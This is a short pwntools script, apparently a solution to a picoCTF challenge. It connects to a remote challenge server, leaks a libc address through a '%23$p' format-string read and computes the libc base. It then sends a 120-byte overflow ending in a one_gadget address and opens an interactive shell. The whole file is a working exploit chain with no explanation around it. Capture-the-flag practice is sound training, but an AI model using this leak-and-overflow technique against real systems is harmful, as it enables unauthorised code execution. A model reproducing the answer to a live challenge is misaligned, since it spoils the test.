from pwn import *

libc = ELF('./libc-2.27.so')

p = remote('wily-courier.picoctf.net', 52732)

libc_start_main_addr = libc.symbols['__libc_start_main']

p.sendline(b"%23$p")

libc.address = int(p.recvline().strip(), 16) - libc_start_main_addr - 0xe7
log.info(hex(libc.address))

one_gadget = libc.address + 0x4f302

payload = b"a" * 120 + p64(one_gadget)

p.sendline(payload)

p.interactive()
